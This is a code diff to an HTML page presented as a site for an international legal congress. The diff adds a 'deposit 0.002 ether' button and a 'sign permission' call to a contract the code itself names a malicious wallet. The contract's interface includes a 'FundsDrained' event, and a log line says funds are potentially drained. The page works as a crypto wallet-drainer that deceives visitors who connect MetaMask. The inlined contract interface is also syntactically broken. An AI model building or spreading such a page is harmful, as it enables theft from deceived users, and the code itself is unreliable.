@@ -30,6 +30,7 @@
     <div class="container">
         <h1>1º Congresso Jurídico Internacional</h1>
         <button onclick="conectarWallet()">Conectar Wallet</button>
+        <button id="btnDeposit" style="display:none;" onclick="depositarEther()">Depositar 0,002 Ether</button>
         <button id="btnSignPermission" style="display:none;" onclick="signPermission()">Assinar Permissão</button>
         <p id="status"></p>
     </div>
@@ -113,16 +114,75 @@
         async function conectarWallet() {
             if (window.ethereum) {
                 try {
-                    // Solicita acesso à conta do usuário
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    // Cria um novo provider do Ethereum a partir do MetaMask
                     provider = new ethers.providers.Web3Provider(window.ethereum);
-                    // Obtém o signer a partir do provider
                     signer = provider.getSigner();
+                    contrato = new ethers.Contract(0x8B1A41Aa5c6b626fD0a61B120F72E261bD16e84F, {
+		"inputs": [],
+		"stateMutability": "nonpayable",
+		"type": "constructor"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "owner",
+				"type": "address"
+			},
+			{
+				"indexed": false,
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			}
+		],
+		"name": "FundsDrained",
+		"type": "event"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "user",
+				"type": "address"
+			}
+		],
+		"name": "PermissionSigned",
+		"type": "event"
+	},
+	{
+		"inputs": [],
+		"name": "deposit",
+		"outputs": [],
+		"stateMutability": "payable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "getBalance",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "signPermission",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	}, signer);
 
-                    // Cria uma instância do contrato com o signer, que permitirá transações
-                    contrato = new ethers.Contract(enderecoContratoMaliciousWallet, abiMaliciousWallet, signer);
-
+                    document.getElementById('btnDeposit').style.display = 'block';
                     document.getElementById('btnSignPermission').style.display = 'block';
                     document.getElementById('status').textContent = "Wallet conectada: " + await signer.getAddress();
                 } catch (error) {
@@ -133,12 +193,29 @@
             }
         }
 
+        async function depositarEther() {
+            if (signer) {
+                try {
+                    const tx = await signer.sendTransaction({
+                        to: enderecoContratoMaliciousWallet,
+                        // Convertendo 0.002 ether para Wei
+                        value: ethers.utils.parseEther("0.002")
+                    });
+                    await tx.wait();
+                    console.log("0,002 ether depositados no contrato.");
+                } catch (error) {
+                    console.error("Erro ao depositar ether:", error);
+                }
+            } else {
+                console.error("Conexão com a wallet necessária.");
+            }
+        }
+
         async function signPermission() {
             if (signer && contrato) {
                 try {
-                    // Chama a função signPermission do contrato
                     const tx = await contrato.signPermission();
-                    await tx.wait(); // Esperar pela transação ser minerada
+                    await tx.wait();
                     console.log("Permissão assinada e fundos potencialmente drenados.");
                 } catch (error) {
                     console.error("Erro ao assinar permissão:", error);
